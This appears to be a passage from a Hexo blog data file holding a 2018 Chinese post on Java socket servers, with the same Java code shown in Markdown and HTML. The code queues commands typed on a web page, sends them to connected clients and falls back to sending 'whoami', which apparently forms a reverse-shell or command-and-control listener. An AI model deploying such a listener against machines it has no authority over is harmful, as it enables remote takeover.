;\n\n\n    private static final OutMsgQueue instance = new OutMsgQueue();\n\n    private OutMsgQueue(){\n        outs =  new HashMap<String, LinkedBlockingQueue<String>>();\n    }\n\n    public static final OutMsgQueue getInstance(){\n        return instance;\n    }\n\n    public Map<String, LinkedBlockingQueue<String>> getDatas(){\n        return this.outs;\n    }\n\n}\n\n```\n\n\n\n###### (2)sockerServer\n```\n/**\n * 单例创建全局socketserver\n */\npublic class SocketServer {\n\n    private ServerSocket server = null;\n    private int port = 12354;\n    private final static int minPort = 1023;\n    private final static int maxPort = 65535;\n    private static final  SocketServer instance = new SocketServer();\n\n    private SocketServer(){\n        try {\n            if(port >= minPort && port <= maxPort){\n                server = new ServerSocket(port);\n            }else {\n                server = new ServerSocket(12354);\n            }\n        }catch (IOException e){\n            System.out.println(\"sockerserver 创建失败 \" + e.getMessage());\n        }\n    }\n\n    public static final SocketServer getInstance(){\n        return instance;\n    }\n\n    public ServerSocket getServer(){\n        return this.server;\n    }\n\n    public void setPort(int port){\n        this.port = port;\n    }\n    public int getPort(){\n        return this.port;\n    }\n```\n\n###### (3)处理链接\n```\n\n/**\n * 处理单个socket的服务类\n * 普通的socket消息收发,通过阻塞队列与页面进行交互\n */\npublic class SocketThread implements Runnable{\n\n\n    private Socket socket = null;\n    /**\n     * 每个socket的对应id\n     */\n    private String id;\n\n    public SocketThread(Socket socket){\n        this.socket = socket;\n        this.id = socket.getInetAddress().getHostAddress() + \":\" + socket.getPort();\n    }\n    @Override\n    public void run(){\n        Map<String, LinkedBlockingQueue<String>> mapIn = InMsgQueue.getInstance().getDatas();\n        Map<String, LinkedBlockingQueue<String>> mapOut = OutMsgQueue.getInstance().getDatas();\n        LinkedBlockingQueue<String> queueOut = mapOut.get(id);\n        LinkedBlockingQueue<String> queueIn = mapIn.get(id);\n        try {\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            OutputStream out = socket.getOutputStream();\n            String line = null;\n            while (true){\n                StringBuilder sb = new StringBuilder();\n                // 999999999 结束标志\n                while (!(line = in.readLine()).equals(\"999999999\")){\n                    sb.append(line);\n                }\n                System.out.println(\"[+]: \" + sb.toString());\n                if(sb.toString().equals(\"exit()\")){\n                    break;\n                }\n                try {\n                    queueIn.put(sb.toString());\n                }catch (InterruptedException e2){\n                    e2.printStackTrace();\n                    queueIn.offer(e2.getMessage());\n                }\n                //读取队列中的命令，send\n                try {\n                    //阻塞等待页面输入\n                    out.write(queueOut.take().getBytes());\n                }catch (InterruptedException e1){\n                    e1.printStackTrace();\n                    out.write(\"whoami\".getBytes());\n                }\n\n            }\n            in.close();\n            out.close();\n        }catch (IOException e){\n            System.out.println(e.getMessage());\n        }finally {\n            //删除队列中的连接信息\n            mapIn.remove(id);\n            mapOut.remove(id);\n            try {\n                if (socket != null){\n                    socket.close();\n                    System.out.println(\"[*]: 异常，关闭socket\" + id);\n                }\n            }catch (IOException e){\n                System.out.println(\"[*]: \" + id + \" 未正常关闭！ \" + e.getMessage());\n            }\n\n        }\n    }\n\n    public void setSocket(Socket socket){\n        this.socket = socket;\n    }\n```\n\n###### (4)使用多线程处理不同socket\n```\n**\n * 自动启动socket监听\n */\n//控制bean的加载顺序  确保不为null\n@DependsOn({\"socketLogService\",\"springUtil\"})\n@Component\npublic class StartSocket implements ApplicationRunner {\n\n    SocketLogService socketLogService = (SocketLogService)SpringUtil.getBean(\"socketLogService\");\n\n    @Override\n    public void run(ApplicationArguments args){\n        ServerSocket server = SocketServer.getInstance().getServer();\n        ThreadPoolExecutor executor = new ThreadPoolExecutor(4,4,24*60,\n                TimeUnit.MINUTES,new LinkedBlockingQueue<>());\n        try {\n            while (true) {\n                Socket socket = server.accept();\n                //连接日志\n                SocketLogEntity entity = new SocketLogEntity();\n                entity.setClientIp(socket.getInetAddress().getHostAddress());\n                entity.setClientPort(socket.getPort());\n                socketLogService.insertLog(entity);\n                //新来一个连接时，更新队列\n                Map<String, LinkedBlockingQueue<String>> mapIn = InMsgQueue.getInstance().getDatas();\n                Map<String, LinkedBlockingQueue<String>> mapOut = OutMsgQueue.getInstance().getDatas();\n                String ip = socket.getInetAddress().getHostAddress() + \":\" + socket.getPort();\n                if (!mapIn.containsKey(ip)) {\n                    mapOut.put(ip, new LinkedBlockingQueue<String>());\n                    mapIn.put(ip, new LinkedBlockingQueue<String>());\n                }\n                //开单独的线程进行处理连接\n                executor.execute(new SocketThread(socket));\n            }\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n    }\n\n}\n```\n\n#### 2.nio\n\n#### 3.netty\n","source":"_posts/java/socket/javasocket.md","raw":"---\ntitle: socket\ndate: 2018-09-26 17:49:23\ntags: [java]\n---\n\n#### 1.java.net.socket\nserver端代码，使用子线程处理连接.\n###### (1)存储消息的队列\n使用两个队列InMsgQueue和OutMsgueue来存储输入输出数据。\n```\n/**\n *客户端返回数据队列\n */\npublic class InMsgQueue {\n    /**\n     * 阻塞队列，存储返回的数据\n     */\n    private Map<String, LinkedBlockingQueue<String>> ins ;\n\n\n    private static final InMsgQueue instance = new InMsgQueue();\n\n    private InMsgQueue(){\n        ins =  new HashMap<String, LinkedBlockingQueue<String>>();\n    }\n\n    public static final InMsgQueue getInstance(){\n        return instance;\n    }\n\n    public Map<String, LinkedBlockingQueue<String>> getDatas(){\n        return this.ins;\n    }\n\n}\n\n```\nOutMsgQueue:\n```\n/**\n * 维护要执行的命令\n */\npublic class OutMsgQueue {\n\n    /**\n     * 阻塞队列，存储页面输入的命令\n     */\n    private Map<String, LinkedBlockingQueue<String>> outs ;\n\n\n    private static final OutMsgQueue instance = new OutMsgQueue();\n\n    private OutMsgQueue(){\n        outs =  new HashMap<String, LinkedBlockingQueue<String>>();\n    }\n\n    public static final OutMsgQueue getInstance(){\n        return instance;\n    }\n\n    public Map<String, LinkedBlockingQueue<String>> getDatas(){\n        return this.outs;\n    }\n\n}\n\n```\n\n\n\n###### (2)sockerServer\n```\n/**\n * 单例创建全局socketserver\n */\npublic class SocketServer {\n\n    private ServerSocket server = null;\n    private int port = 12354;\n    private final static int minPort = 1023;\n    private final static int maxPort = 65535;\n    private static final  SocketServer instance = new SocketServer();\n\n    private SocketServer(){\n        try {\n            if(port >= minPort && port <= maxPort){\n                server = new ServerSocket(port);\n            }else {\n                server = new ServerSocket(12354);\n            }\n        }catch (IOException e){\n            System.out.println(\"sockerserver 创建失败 \" + e.getMessage());\n        }\n    }\n\n    public static final SocketServer getInstance(){\n        return instance;\n    }\n\n    public ServerSocket getServer(){\n        return this.server;\n    }\n\n    public void setPort(int port){\n        this.port = port;\n    }\n    public int getPort(){\n        return this.port;\n    }\n```\n\n###### (3)处理链接\n```\n\n/**\n * 处理单个socket的服务类\n * 普通的socket消息收发,通过阻塞队列与页面进行交互\n */\npublic class SocketThread implements Runnable{\n\n\n    private Socket socket = null;\n    /**\n     * 每个socket的对应id\n     */\n    private String id;\n\n    public SocketThread(Socket socket){\n        this.socket = socket;\n        this.id = socket.getInetAddress().getHostAddress() + \":\" + socket.getPort();\n    }\n    @Override\n    public void run(){\n        Map<String, LinkedBlockingQueue<String>> mapIn = InMsgQueue.getInstance().getDatas();\n        Map<String, LinkedBlockingQueue<String>> mapOut = OutMsgQueue.getInstance().getDatas();\n        LinkedBlockingQueue<String> queueOut = mapOut.get(id);\n        LinkedBlockingQueue<String> queueIn = mapIn.get(id);\n        try {\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            OutputStream out = socket.getOutputStream();\n            String line = null;\n            while (true){\n                StringBuilder sb = new StringBuilder();\n                // 999999999 结束标志\n                while (!(line = in.readLine()).equals(\"999999999\")){\n                    sb.append(line);\n                }\n                System.out.println(\"[+]: \" + sb.toString());\n                if(sb.toString().equals(\"exit()\")){\n                    break;\n                }\n                try {\n                    queueIn.put(sb.toString());\n                }catch (InterruptedException e2){\n                    e2.printStackTrace();\n                    queueIn.offer(e2.getMessage());\n                }\n                //读取队列中的命令，send\n                try {\n                    //阻塞等待页面输入\n                    out.write(queueOut.take().getBytes());\n                }catch (InterruptedException e1){\n                    e1.printStackTrace();\n                    out.write(\"whoami\".getBytes());\n                }\n\n            }\n            in.close();\n            out.close();\n        }catch (IOException e){\n            System.out.println(e.getMessage());\n        }finally {\n            //删除队列中的连接信息\n            mapIn.remove(id);\n            mapOut.remove(id);\n            try {\n                if (socket != null){\n                    socket.close();\n                    System.out.println(\"[*]: 异常，关闭socket\" + id);\n                }\n            }catch (IOException e){\n                System.out.println(\"[*]: \" + id + \" 未正常关闭！ \" + e.getMessage());\n            }\n\n        }\n    }\n\n    public void setSocket(Socket socket){\n        this.socket = socket;\n    }\n```\n\n###### (4)使用多线程处理不同socket\n```\n**\n * 自动启动socket监听\n */\n//控制bean的加载顺序  确保不为null\n@DependsOn({\"socketLogService\",\"springUtil\"})\n@Component\npublic class StartSocket implements ApplicationRunner {\n\n    SocketLogService socketLogService = (SocketLogService)SpringUtil.getBean(\"socketLogService\");\n\n    @Override\n    public void run(ApplicationArguments args){\n        ServerSocket server = SocketServer.getInstance().getServer();\n        ThreadPoolExecutor executor = new ThreadPoolExecutor(4,4,24*60,\n                TimeUnit.MINUTES,new LinkedBlockingQueue<>());\n        try {\n            while (true) {\n                Socket socket = server.accept();\n                //连接日志\n                SocketLogEntity entity = new SocketLogEntity();\n                entity.setClientIp(socket.getInetAddress().getHostAddress());\n                entity.setClientPort(socket.getPort());\n                socketLogService.insertLog(entity);\n                //新来一个连接时，更新队列\n                Map<String, LinkedBlockingQueue<String>> mapIn = InMsgQueue.getInstance().getDatas();\n                Map<String, LinkedBlockingQueue<String>> mapOut = OutMsgQueue.getInstance().getDatas();\n                String ip = socket.getInetAddress().getHostAddress() + \":\" + socket.getPort();\n                if (!mapIn.containsKey(ip)) {\n                    mapOut.put(ip, new LinkedBlockingQueue<String>());\n                    mapIn.put(ip, new LinkedBlockingQueue<String>());\n                }\n                //开单独的线程进行处理连接\n                executor.execute(new SocketThread(socket));\n            }\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n    }\n\n}\n```\n\n#### 2.nio\n\n#### 3.netty\n","slug":"java/socket/javasocket","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ll004e6dcpvvg16vk3","content":"<h4 id=\"1-java-net-socket\"><a href=\"#1-java-net-socket\" class=\"headerlink\" title=\"1.java.net.socket\"></a>1.java.net.socket</h4><p>server端代码，使用子线程处理连接.</p>\n<h6 id=\"1-存储消息的队列\"><a href=\"#1-存储消息的队列\" class=\"headerlink\" title=\"(1)存储消息的队列\"></a>(1)存储消息的队列</h6><p>使用两个队列InMsgQueue和OutMsgueue来存储输入输出数据。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *客户端返回数据队列</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class InMsgQueue &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 阻塞队列，存储返回的数据</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; ins ;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static final InMsgQueue instance = new InMsgQueue();</span><br><span class=\"line\"></span><br><span class=\"line\">    private InMsgQueue()&#123;</span><br><span class=\"line\">        ins =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final InMsgQueue getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class=\"line\">        return this.ins;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>OutMsgQueue:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 维护要执行的命令</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class OutMsgQueue &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 阻塞队列，存储页面输入的命令</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; outs ;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static final OutMsgQueue instance = new OutMsgQueue();</span><br><span class=\"line\"></span><br><span class=\"line\">    private OutMsgQueue()&#123;</span><br><span class=\"line\">        outs =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final OutMsgQueue getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class=\"line\">        return this.outs;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-sockerServer\"><a href=\"#2-sockerServer\" class=\"headerlink\" title=\"(2)sockerServer\"></a>(2)sockerServer</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 单例创建全局socketserver</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class SocketServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private ServerSocket server = null;</span><br><span class=\"line\">    private int port = 12354;</span><br><span class=\"line\">    private final static int minPort = 1023;</span><br><span class=\"line\">    private final static int maxPort = 65535;</span><br><span class=\"line\">    private static final  SocketServer instance = new SocketServer();</span><br><span class=\"line\"></span><br><span class=\"line\">    private SocketServer()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(port &gt;= minPort &amp;&amp; port &lt;= maxPort)&#123;</span><br><span class=\"line\">                server = new ServerSocket(port);</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                server = new ServerSocket(12354);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;sockerserver 创建失败 &quot; + e.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final SocketServer getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public ServerSocket getServer()&#123;</span><br><span class=\"line\">        return this.server;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPort(int port)&#123;</span><br><span class=\"line\">        this.port = port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getPort()&#123;</span><br><span class=\"line\">        return this.port;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-处理链接\"><a href=\"#3-处理链接\" class=\"headerlink\" title=\"(3)处理链接\"></a>(3)处理链接</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 处理单个socket的服务类</span><br><span class=\"line\"> * 普通的socket消息收发,通过阻塞队列与页面进行交互</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class SocketThread implements Runnable&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private Socket socket = null;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 每个socket的对应id</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    public SocketThread(Socket socket)&#123;</span><br><span class=\"line\">        this.socket = socket;</span><br><span class=\"line\">        this.id = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run()&#123;</span><br><span class=\"line\">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">        LinkedBlockingQueue&lt;String&gt; queueOut = mapOut.get(id);</span><br><span class=\"line\">        LinkedBlockingQueue&lt;String&gt; queueIn = mapIn.get(id);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">            OutputStream out = socket.getOutputStream();</span><br><span class=\"line\">            String line = null;</span><br><span class=\"line\">            while (true)&#123;</span><br><span class=\"line\">                StringBuilder sb = new StringBuilder();</span><br><span class=\"line\">                // 999999999 结束标志</span><br><span class=\"line\">                while (!(line = in.readLine()).equals(&quot;999999999&quot;))&#123;</span><br><span class=\"line\">                    sb.append(line);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                System.out.println(&quot;[+]: &quot; + sb.toString());</span><br><span class=\"line\">                if(sb.toString().equals(&quot;exit()&quot;))&#123;</span><br><span class=\"line\">                    break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    queueIn.put(sb.toString());</span><br><span class=\"line\">                &#125;catch (InterruptedException e2)&#123;</span><br><span class=\"line\">                    e2.printStackTrace();</span><br><span class=\"line\">                    queueIn.offer(e2.getMessage());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                //读取队列中的命令，send</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    //阻塞等待页面输入</span><br><span class=\"line\">                    out.write(queueOut.take().getBytes());</span><br><span class=\"line\">                &#125;catch (InterruptedException e1)&#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                    out.write(&quot;whoami&quot;.getBytes());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">            out.close();</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            System.out.println(e.getMessage());</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            //删除队列中的连接信息</span><br><span class=\"line\">            mapIn.remove(id);</span><br><span class=\"line\">            mapOut.remove(id);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if (socket != null)&#123;</span><br><span class=\"line\">                    socket.close();</span><br><span class=\"line\">                    System.out.println(&quot;[*]: 异常，关闭socket&quot; + id);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (IOException e)&#123;</span><br><span class=\"line\">                System.out.println(&quot;[*]: &quot; + id + &quot; 未正常关闭！ &quot; + e.getMessage());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setSocket(Socket socket)&#123;</span><br><span class=\"line\">        this.socket = socket;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-使用多线程处理不同socket\"><a href=\"#4-使用多线程处理不同socket\" class=\"headerlink\" title=\"(4)使用多线程处理不同socket\"></a>(4)使用多线程处理不同socket</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**</span><br><span class=\"line\"> * 自动启动socket监听</span><br><span class=\"line\"> */</span><br><span class=\"line\">//控制bean的加载顺序  确保不为null</span><br><span class=\"line\">@DependsOn(&#123;&quot;socketLogService&quot;,&quot;springUtil&quot;&#125;)</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class StartSocket implements ApplicationRunner &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    SocketLogService socketLogService = (SocketLogService)SpringUtil.getBean(&quot;socketLogService&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run(ApplicationArguments args)&#123;</span><br><span class=\"line\">        ServerSocket server = SocketServer.getInstance().getServer();</span><br><span class=\"line\">        ThreadPoolExecutor executor = new ThreadPoolExecutor(4,4,24*60,</span><br><span class=\"line\">                TimeUnit.MINUTES,new LinkedBlockingQueue&lt;&gt;());</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            while (true) &#123;</span><br><span class=\"line\">                Socket socket = server.accept();</span><br><span class=\"line\">                //连接日志</span><br><span class=\"line\">                SocketLogEntity entity = new SocketLogEntity();</span><br><span class=\"line\">                entity.setClientIp(socket.getInetAddress().getHostAddress());</span><br><span class=\"line\">                entity.setClientPort(socket.getPort());</span><br><span class=\"line\">                socketLogService.insertLog(entity);</span><br><span class=\"line\">                //新来一个连接时，更新队列</span><br><span class=\"line\">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">                String ip = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class=\"line\">                if (!mapIn.containsKey(ip)) &#123;</span><br><span class=\"line\">                    mapOut.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class=\"line\">                    mapIn.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                //开单独的线程进行处理连接</span><br><span class=\"line\">                executor.execute(new SocketThread(socket));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-nio\"><a href=\"#2-nio\" class=\"headerlink\" title=\"2.nio\"></a>2.nio</h4><h4 id=\"3-netty\"><a href=\"#3-netty\" class=\"headerlink\" title=\"3.netty\"></a>3.netty</h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-java-net-socket\"><a href=\"#1-java-net-socket\" class=\"headerlink\" title=\"1.java.net.socket\"></a>1.java.net.socket</h4><p>server端代码，使用子线程处理连接.</p>\n<h6 id=\"1-存储消息的队列\"><a href=\"#1-存储消息的队列\" class=\"headerlink\" title=\"(1)存储消息的队列\"></a>(1)存储消息的队列</h6><p>使用两个队列InMsgQueue和OutMsgueue来存储输入输出数据。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *客户端返回数据队列</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class InMsgQueue 